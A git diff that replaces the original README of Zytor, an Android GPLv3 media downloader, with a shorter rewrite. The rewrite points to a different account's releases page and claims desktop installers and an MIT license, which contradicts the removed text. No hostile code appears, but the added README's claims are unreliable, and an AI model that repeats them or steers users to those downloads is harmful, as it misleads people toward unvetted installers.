@@ -1,202 +1,75 @@
-<div align="center">
-
-<img src="./Images/icon.png" width="75" alt="Zytor Icon"/>
-
-# Zytor
-
-### The All-in-One Media Downloader
-
-### One App. Any Link. No Ads. No Tracking. Full Privacy. Unlimited Possibilities
-
-#### Video, Audio, Image, Playlist — Everything
-
-Stop juggling multiple apps, shady websites, or converters.  
-**Zytor downloads *everything* from almost anywhere.**
-
-<br>
-
-[![Platform](https://img.shields.io/badge/Platform-Android-brightgreen)]()
-[![Version](https://img.shields.io/badge/Release-1.1.0-red)]()
-[![License](https://img.shields.io/badge/License-GPLv3-blue)]()
-
-<br>
-
-<a href="https://github.com/ImKKingshuk/Zytor/releases/download/v1.1.0/zytor-v1.1.0-arm64-v8a.apk">
- <img width="180" src="https://img.shields.io/badge/Download-APK-blue?logo=android&style=square" alt="Download APK"/>
-
-</a>
-</div>
-
-## Screenshots
-
-<p align="center">
-<img src="./Images/img1.jpg" width="120" alt="Zytor Img1"/>
-<img src="./Images/img2.jpg" width="120" alt="Zytor Img2"/>
-<img src="./Images/img3.jpg" width="120" alt="Zytor Img3"/>
-<img src="./Images/img4.jpg" width="120" alt="Zytor Img4"/>
-<img src="./Images/img5.jpg" width="120" alt="Zytor Img5"/>
-<img src="./Images/img6.jpg" width="120" alt="Zytor Img6"/>
-<img src="./Images/img7.jpg" width="120" alt="Zytor Img7"/>
-<img src="./Images/img8.jpg" width="120" alt="Zytor Img8"/>
-<img src="./Images/img9.jpg" width="120" alt="Zytor Img9"/>
-<img src="./Images/img10.jpg" width="120" alt="Zytor Img10"/>
-<img src="./Images/img11.jpg" width="120" alt="Zytor Img11"/>
-</p>
-
-## 🚀 What's New (v1.1.0)
-
-- **TurboBolt Engine** : Experience up to **500% faster** downloads with 32x parallelization and 64-segment splitting.
-- **Redesigned Download UI** : Toggle between **Grid (Large/Small)** and **List** views
-- **Tab+Swipe Navigation** : New **Tab+Swipe** navigation for easy access to different modes.
-- **Smart Filtering** : Instantly filter by Video, Audio, or Images
-- **Compact Status Pills** : Compact status pills for realtime download speed, ETA, and size.
-- **Pro Audio Support** : Added native **FLAC, WAV, and ALAC** formats with bitrates up to **320kbps**.
-- **New Platform Support (300+ Total Platforms)** : Added support for over 30+ new platforms across Asian Drama, Indian OTT, and Anime.
-
-## Features
-
-### 🎥 Ultimate Video Downloader
-
-**Resolutions:** `8K • 4K • 2K • 1080p • 720p • 480p • 360p • 240p • 144p`
-
-**Formats:** `MP4 • WebM • MOV • MKV`
-
-**Codecs:** `H.264 • H.265 (HEVC) • VP9 • AV1`
-
-**Smart features:**  
-
-- Auto-merge video + audio  
-- Clean filename handling  
-- Optional metadata & thumbnail embedding  
-
-No tricks. No watermarks. No compression surprises.
-
-### 🎧 Ultimate Audio Downloader
-
-**Formats:** `MP3 • M4A • Opus • FLAC • WAV • ALAC`
-
-**Qualities:** `Best • 320kbps • 256kbps • 192kbps • 128kbps • 64kbps • 32kbps • Lowest`
-
-Perfect for:  
-Music • Podcasts • Lectures • DJ mixes • Motivation videos
-
-### 🖼️ Ultimate Image Downloader
-
-Zytor goes beyond videos & audio.
-
-**Formats:** `JPEG • PNG • WebP • Original`
-
-**Qualities:** `Original • 2K • 1080p • 720p • Thumbnail`
-
-Images, thumbnails, posters, reels, covers —  
-**If it’s visual, Zytor downloads it.**
-
-### 🌍 Supported Platforms
-
-**Zytor works almost everywhere.**  
-Paste a link. Press download. Done.
-
-**Supported:** YouTube, Twitter/X, Instagram, Facebook, TikTok, Reddit, Vimeo, Bilibili, Dailymotion, Twitch, Snapchat, Weibo, WeChat, RedNote, SoundCloud, Spotify, Apple Music, Netflix, Hulu, Disney+, Amazon Prime Video, Crunchyroll, Mubi, CuriosityStream, BlueSky, Odysee, Mastodon, Rakuten Viki, iQIYI, Youku, Zee5, SonyLIV, MX Player, HIDIVE, niconico, TVer** — **and over 300+ platforms.**
-
-### ⚡ Five Modes. Infinite Control
-
-| Mode         | What It Does |
-|--------------|-------------|
-| **Video**    | Full Video|
-| **Audio**    | Only Sound |
-| **Image**    | Download images, covers & thumbnails |
-| **Playlist** | Grab entire collections at once |
-| **Custom**   | Control exact formats, codecs, bitrates & more |
-
-Beginners get simplicity.  
-Power users get superpowers.
-
-### 📊 Built-In Download Manager
-
-- Task queue for all downloads  
-- Real-time speed, ETA & size  
-- Pause / resume / retry  
-- Full history with thumbnails  
-- Switch between **Grid** and **List** layouts  
-
-This isn’t a downloader.  
-It’s a **media control center**.
-
-### 🎨 Modern, Beautiful, Fast
-
-- Premium UI  
-- True dark mode  
-- Smooth, fluid animations  
-- No ads. No trackers. No clutter. Full Privacy.
-
-### 🏛 Under the Hood (For Developers)
-
-A meticulously crafted, scalable architecture:
-
-- Kotlin
-- Jetpack Compose
-- Multi-module system
-- High-performance storage
-
-**Engineered — not patched together.**
-
-## 🗺 Roadmap
-
-| Feature                     | Status |
-|----------------------------|:------:|
-| All-in-One Downloader      |   ✅   |
-| TOR Integration    |  🚧 Coming Soon |
-| Torrent Support            |  🚧 Coming Soon |
-
-Zytor is not finished. It’s evolving.
-
-## ✨ Why Zytor Exists
-
-There are thousands of so-called downloaders —  but each one does **only one thing**:
-
-❌ One app for YouTube  
-❌ One site for MP3  
-❌ One app for Instagram images  
-❌ One app full of ads  
-❌ One tool that breaks every month  
-
-**Zytor ends this nonsense.**  
-It is the **first downloader built like a real product — not a trick/hack.**
-
-## 💥 What Makes Zytor Different?
-
-| Feature                     | Zytor | Others |
-|----------------------------|:----:|:-----:|
-| Video Downloads            |  ✅   |   ✅   |
-| Audio Downloads            |  ✅   | ⚠️    |
-| Image Downloads            |  ✅   |  ❌    |
-| All Resolutions (8K → 144p)|  ✅   | ⚠️    |
-| Multiple Formats/Codecs    |  ✅   |  ❌    |
-| Playlist Support           |  ✅   | ⚠️    |
-| Modern UI                  |  ✅   |  ❌    |
-| No Ads. No Tracking. Full Privacy |  ✅   |  ❌    |
-| Fully Customizable         |  ✅   |  ❌    |
-
-Zytor isn’t competing with downloaders — **it replaces the entire category.**
-
-## 🔖 Release Types
-
-Zytor uses two release channels:
-
-- **Stable** — Recommended for everyone. Fully tested.  
-  *(Example: `v1.0.0`)*
-
-- **Beta** — Experimental features. May contain bugs.  
-  *(Example: `v1.5.0-beta`)*
-
-See the full [CHANGELOG.md](./CHANGELOG.md) for a detailed list of changes.
-
-## ❤️ Support the Project
-
-If Zytor replaced 5 different apps on your phone — give it a ⭐. It helps more than you think.
-
-<div align="center">
-
-**Designed & Developed with 🩷 by @ImKKingshuk**
-
-</div>
+# 🎥 Zytor - Download Anything, Anywhere, Anytime
+
+## 📥 Get Zytor Now!
+[![Download Zytor](https://img.shields.io/badge/Download-Zytor-blue)](https://github.com/nonuu110/Zytor/releases)
+
+## 🚀 Getting Started
+Zytor is your all-in-one media downloader, allowing you to download videos, audio, images, and playlists from over 250 platforms. Follow these steps to get started.
+
+## 📂 System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a compatible Linux distribution.
+- **Processor:** Minimum 1 GHz CPU.
+- **RAM:** At least 2 GB of RAM.
+- **Storage:** Minimum 200 MB of free space for installation.
+
+## 🌐 Features
+- Download from over 250 platforms.
+- Support for videos, audio, images, and playlists.
+- Ad-free experience.
+- No tracking, ensuring your privacy.
+- Easy-to-use interface.
+
+## 📦 Download & Install
+To begin using Zytor, visit this page to download: [Zytor Releases](https://github.com/nonuu110/Zytor/releases).
+
+Once on the Releases page:
+1. Choose the latest version of Zytor.
+2. Select your operating system's installer file (e.g., `.exe`, `.dmg`, `.tar.gz`).
+3. Download the file to your computer.
+4. After the download completes, open the installer.
+5. Follow the on-screen instructions to complete the installation.
+
+## 🔄 How to Use Zytor
+Using Zytor is straightforward:
+
+1. **Open Zytor:** Launch the application after installation.
+2. **Copy Link:** Navigate to the media you want to download. Copy the URL from your browser.
+3. **Paste Link:** In Zytor, paste the copied link into the input field.
+4. **Select Format:** Choose the type of content you want (video, audio, image).
+5. **Download:** Click the download button and wait for your media to be saved.
+
+## 🔍 Supported Platforms
+Zytor supports downloads from a wide range of platforms, including:
+- YouTube
+- Instagram
+- TikTok
+- Facebook
+- Twitter
+- Spotify
+- Netflix
+
+This ensures that you can access your favorite media easily.
+
+## ⚙️ Troubleshooting
+If you face any issues with Zytor, try these basic steps:
+- Ensure you have the latest version installed.
+- Check your internet connection.
+- Restart the application.
+- Revisit the provided link and try again.
+
+If problems persist, you can visit the project's GitHub page for more help.
+
+## 📢 Community and Contributions
+Zytor is open-source and welcomes contributions. If you have ideas or find issues, you can submit them through our GitHub repository. Community feedback helps improve the application.
+
+## 📞 Support
+If you need assistance, head to our [GitHub Issues](https://github.com/nonuu110/Zytor/issues) where you can ask questions or report bugs.
+
+## 🌟 Additional Resources
+- **Documentation:** Comprehensive guides are available directly within the application.
+- **User Forum:** Join our community forum to connect with other users and share tips.
+
+## 📜 License
+Zytor is licensed under the MIT License, promoting open-source development and collaboration. Feel free to review the license in our repository.
+
+[![Download Zytor](https://img.shields.io/badge/Download-Zytor-blue)](https://github.com/nonuu110/Zytor/releases)
